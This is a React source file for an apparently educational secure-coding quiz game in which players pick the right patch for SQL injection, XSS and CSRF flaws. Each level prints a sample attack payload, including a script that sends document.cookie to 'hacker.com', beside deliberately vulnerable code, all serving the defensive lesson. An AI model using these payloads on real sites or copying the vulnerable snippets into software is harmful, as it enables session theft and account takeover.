import React, { useState, useEffect, useRef } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { ShieldAlert, ArrowLeft, RefreshCw, Trophy, Sparkles, ShieldCheck, Terminal, AlertTriangle, HelpCircle } from 'lucide-react';
import api from '../api/axios';
import { navigateTo } from '@/utils/navigation';
import { showSuccess, showError } from '@/utils/toastManager';

interface VulnerabilityLevel {
  id: string;
  type: string;
  title: string;
  hackerPayload: string;
  vulnerableCode: string;
  description: string;
  options: Array<{
    id: string;
    code: string;
    isCorrect: boolean;
    explanation: string;
  }>;
}

const LEVELS: VulnerabilityLevel[] = [
  {
    id: 'sqli',
    type: 'SQL Injection (SQLi)',
    title: 'Secure the Login Query',
    hackerPayload: "admin@website.com' OR '1'='1",
    vulnerableCode: `// Vulnerable Backend Code\napp.post('/api/login', (req, res) => {\n  const { email, password } = req.body;\n  const query = "SELECT * FROM users WHERE email = '" + email + "' AND password = '" + password + "'";\n  db.query(query, (err, user) => {\n    if (user) res.send({ login: true });\n  });\n});`,
    description: 'A hacker is attempting to bypass login validation using a SQL syntax escape payload. Fix the query to separate the query structure from user inputs.',
    options: [
      {
        id: 'A',
        code: `const query = "SELECT * FROM users WHERE email = ? AND password = ?";\ndb.query(query, [email, password], (err, user) => {\n  if (user) res.send({ login: true });\n});`,
        isCorrect: true,
        explanation: 'Correct! Parameterized queries (prepared statements) compile the SQL command template first, treating user parameters strictly as values rather than executable commands.'
      },
      {
        id: 'B',
        code: `// Escape quotes manually\nconst safeEmail = email.replace(/'/g, "\\'");\nconst query = "SELECT * FROM users WHERE email = '" + safeEmail + "' AND password = '" + password + "'";\ndb.query(query, (err, user) => { ... });`,
        isCorrect: false,
        explanation: 'Incorrect! Manual string sanitization/escaping is highly error-prone and can often be bypassed with different encoding tricks or multi-byte characters.'
      },
      {
        id: 'C',
        code: `// Hash the email parameter\nconst hashedEmail = md5(email);\nconst query = "SELECT * FROM users WHERE email = '" + hashedEmail + "'";\ndb.query(query, (err, user) => { ... });`,
        isCorrect: false,
        explanation: 'Incorrect! Hashing the email address will break ordinary login lookups unless the registration record is also hashed, and does not address the underlying injection flaw in other query parameters.'
      }
    ]
  },
  {
    id: 'xss',
    type: 'Cross-Site Scripting (XSS)',
    title: 'Escape User Comments',
    hackerPayload: "<script>fetch('http://hacker.com/steal?c='+document.cookie)</script>",
    vulnerableCode: `// Vulnerable Frontend Code\nfunction renderComment(userInput) {\n  const commentContainer = document.getElementById('comments');\n  // Render comment directly as HTML\n  commentContainer.innerHTML += \`<div class="comment">\${userInput}</div>\`;\n}`,
    description: 'A hacker is injecting arbitrary scripts into the comments feed to steal user session cookies. Secure the comment renderer.',
    options: [
      {
        id: 'A',
        code: `// Clean script tag with simple regex\nconst cleanInput = userInput.replace(/<script>/g, '');\ncommentContainer.innerHTML += \`<div class="comment">\${cleanInput}</div>\`;`,
        isCorrect: false,
        explanation: 'Incorrect! Sanitizing script tags with simple regex is easily bypassed using capitalized tags (<SCRIPT>), nested tags (<scr<script>ipt>), or event handlers (e.g. <img src=x onerror=alert(1)>).'
      },
      {
        id: 'B',
        code: `// Use safe textContent property\nconst commentDiv = document.createElement('div');\ncommentDiv.className = 'comment';\ncommentDiv.textContent = userInput;\ncommentContainer.appendChild(commentDiv);`,
        isCorrect: true,
        explanation: 'Correct! Setting textContent forces the browser to interpret the input strictly as a plain text string rather than rendering it as executable HTML/JS tags.'
      },
      {
        id: 'C',
        code: `// Encode double quotes only\nconst cleanInput = userInput.replace(/"/g, '&quot;');\ncommentContainer.innerHTML += \`<div class="comment">\${cleanInput}</div>\`;`,
        isCorrect: false,
        explanation: 'Incorrect! Encoding double quotes only leaves HTML tags (<, >) and single quotes unescaped, allowing script execution via tag insertion.'
      }
    ]
  },
  {
    id: 'csrf',
    type: 'Cross-Site Request Forgery (CSRF)',
    title: 'Protect Financial Transfer',
    hackerPayload: "Intruder hosts image: <img src='http://bank.com/transfer?to=hacker&amt=5000'>",
    vulnerableCode: `// Vulnerable Backend Code\napp.post('/transfer', (req, res) => {\n  if (req.session.user) {\n    const { to, amount } = req.body;\n    performTransfer(req.session.user, to, amount);\n    res.send({ status: 'success' });\n  }\n});`,
    description: 'A hacker makes authenticated users submit fund transfers implicitly by hosting an auto-submitting image tag on an external site. Protect the transfer endpoint.',
    options: [
      {
        id: 'A',
        code: `// Require a GET request instead of POST\napp.get('/transfer', (req, res) => {\n  const { to, amount } = req.query;\n  performTransfer(req.session.user, to, amount);\n});`,
        isCorrect: false,
        explanation: 'Incorrect! Using GET requests for state-changing operations makes CSRF attacks even easier, as the attacker can perform the action with simple image tags.'
      },
      {
        id: 'B',
        code: `// Validate Host header on incoming request\napp.post('/transfer', (req, res) => {\n  if (req.headers.host !== 'bank.com') {\n    return res.status(403).send('Forbidden');\n  }\n  performTransfer(req.session.user, req.body.to, req.body.amount);\n});`,
        isCorrect: false,
        explanation: 'Incorrect! The Host header indicates the target server (your server), not the source of the request. To check origin, you need CSRF validation or Referer/Origin headers (which are still less secure than CSRF tokens).'
      },
      {
        id: 'C',
        code: `// Integrate CSRF double-submit token middleware\napp.post('/transfer', csrfProtection, (req, res) => {\n  // Token is verified automatically in csrfProtection middleware\n  const { to, amount } = req.body;\n  performTransfer(req.session.user, to, amount);\n  res.send({ status: 'success' });\n});`,
        isCorrect: true,
        explanation: 'Correct! Integrating a randomized CSRF token validation ensures that incoming requests must supply a secret value known only to the client page, which external sites cannot access.'
      }
    ]
  }
];

export const CyberDefense = () => {
  const [currentLevelIdx, setCurrentLevelIdx] = useState(0);
  const currentLevel = LEVELS[currentLevelIdx];

  const [selectedOption, setSelectedOption] = useState<string | null>(null);
  const [hasAnswered, setHasAnswered] = useState(false);
  const [correctCount, setCorrectCount] = useState(0);
  const [timer, setTimer] = useState(60);
  const [terminalLogs, setTerminalLogs] = useState<string[]>([]);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [showOutcomeModal, setShowOutcomeModal] = useState(false);
  const [xpEarned, setXpEarned] = useState(0);
  const [unlockedBadges, setUnlockedBadges] = useState<string[]>([]);

  const intervalRef = useRef<any>(null);

  // Set up terminal logs simulation
  useEffect(() => {
    setTerminalLogs([
      `[SYS_INFO] Initializing cybersecurity proctor sandbox...`,
      `[SYS_WARN] Monitoring network interface cards...`,
      `[ATTACK_DETECTION] Scanning inbound requests for anomalies...`,
    ]);

    const logs = [
      `[INTRUSION] Inbound payload detected on Level ${currentLevelIdx + 1} router!`,
      `[THREAT_VECTOR] Vector detected: ${LEVELS[currentLevelIdx].type}`,
      `[PAYLOAD_DUMP] Payload: "${LEVELS[currentLevelIdx].hackerPayload}"`,
      `[CRITICAL] System breach imminent. Secure database query block now!`
    ];

    let delay = 1000;
    logs.forEach((log) => {
      setTimeout(() => {
        setTerminalLogs((prev) => [...prev, log]);
      }, delay);
      delay += 1200;
    });

    // Reset game states for new level
    setTimer(60);
    setSelectedOption(null);
    setHasAnswered(false);

    if (intervalRef.current) clearInterval(intervalRef.current);
    intervalRef.current = setInterval(() => {
      setTimer((prev) => {
        if (prev <= 1) {
          clearInterval(intervalRef.current);
          handleAnswer(null); // Time out
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => {
      if (intervalRef.current) clearInterval(intervalRef.current);
    };
  }, [currentLevelIdx]);

  const handleAnswer = (optionId: string | null) => {
    if (hasAnswered) return;
    
    clearInterval(intervalRef.current);
    setSelectedOption(optionId);
    setHasAnswered(true);

    const isCorrect = optionId ? currentLevel.options.find(o => o.id === optionId)?.isCorrect : false;
    if (isCorrect) {
      setCorrectCount(prev => prev + 1);
      setTerminalLogs(prev => [...prev, `[SUCCESS] Secure patch successfully loaded! Threat neutralized.`]);
      showSuccess('Patch Successful! Vulnerability secured.');
    } else {
      setTerminalLogs(prev => [...prev, `[BREACH] Patch failed or time out! Firewall integrity compromised.`]);
      showError('Failed to patch. Vulnerability exploited!');
    }
  };

  const nextLevel = () => {
    if (currentLevelIdx < LEVELS.length - 1) {
      setCurrentLevelIdx(prev => prev + 1);
    } else {
      submitOutcome();
    }
  };

  const submitOutcome = async () => {
    setIsSubmitting(true);
    try {
      const response = await api.post('/games/cyber/report', {
        patches: correctCount
      });

      if (response.data?.success) {
        setXpEarned(response.data.data.earnedXp);
        const originalBadges = response.data.data.stats?.badges || [];
        setUnlockedBadges(originalBadges);
        setShowOutcomeModal(true);
      }
    } catch (err: any) {
      showError(err.response?.data?.message || 'Failed to submit security logs');
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="min-h-screen bg-[#0a0c10] text-white pt-24 px-6 pb-20 font-rubik selection:bg-red-500/30">
      <div className="max-w-7xl mx-auto space-y-8">
        
        {/* Header Block */}
        <div className="flex justify-between items-center">
          <div className="flex items-center gap-4">
            <button 
              onClick={() => navigateTo('game-lobby')}
              className="p-3 bg-[#13171d] border border-white/5 hover:border-white/10 rounded-2xl transition-all group"
            >
              <ArrowLeft className="w-5 h-5 text-white/50 group-hover:text-white transition-colors" />
            </button>
            <div>
              <h1 className="text-3xl font-[900] uppercase tracking-tighter italic">Fix the Hack <span className="text-red-500">Sandbox.</span></h1>
              <p className="text-xs text-white/40 font-medium tracking-wide">Secure backend query controllers to protect database instances.</p>
            </div>
          </div>
          
          <div className="px-5 py-2.5 bg-red-500/10 border border-red-500/20 rounded-2xl flex items-center gap-2">
            <AlertTriangle className="w-4 h-4 text-red-500 animate-ping" />
            <span className="text-xs font-black uppercase tracking-wider text-red-500">Level {currentLevelIdx + 1} / {LEVELS.length}</span>
          </div>
        </div>

        {/* Blinking Intrusion Alert Banner */}
        <div className="bg-red-950/20 border border-red-500/30 rounded-3xl p-5 flex items-center gap-4 animate-pulse">
          <ShieldAlert className="w-10 h-10 text-red-500 shrink-0" />
          <div>
            <h2 className="text-sm font-black uppercase tracking-[0.2em] text-red-500">Intrusion Alert</h2>
            <p className="text-xs font-bold text-red-200/60 mt-0.5">Threat: {currentLevel.type} attack payload targeting port 443.</p>
          </div>
        </div>

        {/* Dashboard Grid Layout */}
        <div className="grid grid-cols-1 lg:grid-cols-12 gap-8">
          
          {/* Left Column: Vulnerability Info + Terminal Logs */}
          <div className="lg:col-span-5 space-y-6">
            
            {/* Info Card */}
            <div className="bg-[#13171d] border border-white/5 rounded-3xl p-6 space-y-4">
              <h2 className="text-lg font-[900] uppercase tracking-wider text-red-400">Vulnerability Context</h2>
              <p className="text-sm text-white/60 leading-relaxed font-medium">{currentLevel.description}</p>
              
              <div className="bg-black/40 border border-white/5 rounded-xl p-4 space-y-2">
                <p className="text-[10px] font-black text-white/30 uppercase tracking-widest">Incoming Threat Payload</p>
                <div className="bg-red-500/5 border border-red-500/10 rounded-lg p-2.5 font-mono text-xs text-red-400 break-all">
                  {currentLevel.hackerPayload}
                </div>
              </div>
            </div>

            {/* Simulated Live Terminal logs */}
            <div className="bg-[#13171d] border border-white/5 rounded-3xl p-6 space-y-3">
              <div className="flex items-center gap-2 pb-2 border-b border-white/5">
                <Terminal className="w-5 h-5 text-red-400" />
                <h2 className="text-sm font-black uppercase tracking-wider text-white/40">Telemetry Logs Feed</h2>
              </div>
              <div className="h-44 bg-black/45 border border-white/5 rounded-2xl p-4 font-mono text-[11px] leading-relaxed text-[#00ff9d] overflow-y-auto space-y-2 custom-scrollbar">
                {terminalLogs.map((log, i) => (
                  <div key={i} className={log.includes('[CRITICAL]') || log.includes('[BREACH]') ? 'text-red-500 font-bold' : log.includes('[SUCCESS]') ? 'text-emerald-400 font-bold font-black' : ''}>
                    {log}
                  </div>
                ))}
              </div>
            </div>

          </div>

          {/* Right Column: Code Editor & Choices */}
          <div className="lg:col-span-7 space-y-6">
            
            {/* Vulnerable Code Viewer */}
            <div className="bg-[#13171d] border border-white/5 rounded-3xl p-6 space-y-4">
              <div className="flex justify-between items-center">
                <span className="text-xs font-black uppercase tracking-widest text-white/40">Source Code (Vulnerable)</span>
                <span className={`text-xl font-black italic tracking-tighter ${timer <= 15 ? 'text-red-500 animate-pulse' : 'text-yellow-500'}`}>00:{timer < 10 ? `0${timer}` : timer}</span>
              </div>
              <pre className="p-4 bg-black border border-white/5 rounded-2xl font-mono text-xs text-red-300 leading-relaxed overflow-x-auto custom-scrollbar">
                {currentLevel.vulnerableCode}
              </pre>
            </div>

            {/* Option Choices */}
            <div className="space-y-4">
              <h2 className="text-xs font-black uppercase tracking-widest text-white/40 pl-2">Select Security Patch Code</h2>
              <div className="space-y-4">
                {currentLevel.options.map((option) => {
                  const isSelected = selectedOption === option.id;
                  const isCorrectAnswer = option.isCorrect;
                  
                  let cardStyle = 'bg-[#13171d] border-white/5 hover:border-white/10';
                  if (hasAnswered) {
                    if (isSelected) {
                      cardStyle = isCorrectAnswer ? 'bg-emerald-500/5 border-emerald-500/30' : 'bg-red-500/5 border-red-500/30';
                    } else if (isCorrectAnswer) {
                      cardStyle = 'bg-emerald-500/5 border-emerald-500/30 opacity-70';
                    } else {
                      cardStyle = 'bg-[#13171d]/50 border-white/5 opacity-40';
                    }
                  }

                  return (
                    <div
                      key={option.id}
                      onClick={() => !hasAnswered && handleAnswer(option.id)}
                      className={`border rounded-3xl p-5 cursor-pointer transition-all relative overflow-hidden group ${cardStyle}`}
                    >
                      <div className="flex items-start gap-4">
                        <div className={`w-8 h-8 rounded-xl flex items-center justify-center font-black uppercase text-xs shrink-0 ${hasAnswered && isCorrectAnswer ? 'bg-emerald-500/20 text-emerald-400' : hasAnswered && isSelected ? 'bg-red-500/20 text-red-400' : 'bg-white/5 text-white/40 group-hover:bg-white/10 transition-colors'}`}>
                          {option.id}
                        </div>
                        <div className="flex-1 space-y-3">
                          <pre className="font-mono text-xs text-white/80 leading-relaxed overflow-x-auto custom-scrollbar">
                            {option.code}
                          </pre>
                          
                          {/* Answer Explanation */}
                          {hasAnswered && (isSelected || isCorrectAnswer) && (
                            <motion.div 
                              initial={{ opacity: 0, height: 0 }}
                              animate={{ opacity: 1, height: 'auto' }}
                              className={`p-3.5 rounded-xl text-xs leading-relaxed flex gap-2 ${isCorrectAnswer ? 'bg-emerald-500/10 text-emerald-300' : 'bg-red-500/10 text-red-300'}`}
                            >
                              {isCorrectAnswer ? <ShieldCheck className="w-4 h-4 shrink-0 text-emerald-400 mt-0.5" /> : <HelpCircle className="w-4 h-4 shrink-0 text-red-400 mt-0.5" />}
                              <p>{option.explanation}</p>
                            </motion.div>
                          )}
                        </div>
                      </div>
                    </div>
                  );
                })}
              </div>
            </div>

            {/* Next Level Button */}
            {hasAnswered && (
              <motion.button
                initial={{ opacity: 0, y: 10 }}
                animate={{ opacity: 1, y: 0 }}
                onClick={nextLevel}
                className={`w-full py-4 rounded-2xl font-[900] uppercase tracking-widest text-xs flex items-center justify-center gap-2 shadow-xl ${currentLevelIdx === LEVELS.length - 1 ? 'bg-emerald-600 hover:bg-emerald-500 shadow-emerald-600/20' : 'bg-white text-black hover:bg-gray-200 shadow-white/5'}`}
              >
                {currentLevelIdx === LEVELS.length - 1 ? 'Submit Security Logs' : 'Proceed to Next Threat'}
              </motion.button>
            )}

          </div>

        </div>

      </div>

      {/* Outcome Modal */}
      <AnimatePresence>
        {showOutcomeModal && (
          <motion.div 
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 z-50 flex items-center justify-center bg-black/85 backdrop-blur-md p-6"
          >
            <motion.div 
              initial={{ scale: 0.9, y: 20 }}
              animate={{ scale: 1, y: 0 }}
              exit={{ scale: 0.9, y: 20 }}
              className="bg-[#13171d] border border-white/10 rounded-[35px] max-w-lg w-full p-10 relative overflow-hidden space-y-6 shadow-2xl text-center"
            >
              <div className="absolute top-0 left-0 right-0 h-1.5 bg-red-500" />
              <div className="w-20 h-20 bg-red-500/10 border border-red-500/20 rounded-3xl flex items-center justify-center mx-auto mb-4">
                <ShieldCheck className="w-10 h-10 text-red-400" />
              </div>
              <h2 className="text-3xl font-[900] uppercase tracking-tighter italic">Threats <span className="text-red-500">Secured!</span></h2>
              
              <div className="bg-black/30 border border-white/5 rounded-2xl p-6 space-y-3 max-w-sm mx-auto">
                <div className="flex justify-between text-xs font-bold text-white/50 uppercase">
                  <span>Successful Patches</span>
                  <span className="text-white font-black">{correctCount} / {LEVELS.length}</span>
                </div>
                <div className="w-full h-px bg-white/5" />
                <div className="flex justify-between text-sm font-black text-red-400 uppercase tracking-wider">
                  <span>XP Gained</span>
                  <span>+{xpEarned} XP</span>
                </div>
              </div>

              {/* Show Certified Secure Coder badge unlock */}
              {unlockedBadges.includes('Certified Secure Coder') && (
                <div className="p-4 bg-yellow-500/10 border border-yellow-500/20 rounded-2xl flex items-center justify-center gap-3 text-yellow-400 max-w-sm mx-auto">
                  <Sparkles className="w-5 h-5 shrink-0" />
                  <div className="text-left text-xs">
                    <p className="font-black uppercase tracking-wider">New Badge Unlocked!</p>
                    <p className="font-bold text-yellow-400/60 mt-0.5">Certified Secure Coder (Accumulated 6 patches)</p>
                  </div>
                </div>
              )}

              <button
                onClick={() => {
                  setShowOutcomeModal(false);
                  navigateTo('game-lobby');
                }}
                className="w-full py-4 bg-white text-black hover:bg-gray-200 rounded-xl font-[900] uppercase tracking-widest text-xs transition-all active:scale-95"
              >
                Return to Lobby
              </button>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

    </div>
  );
};
export default CyberDefense;
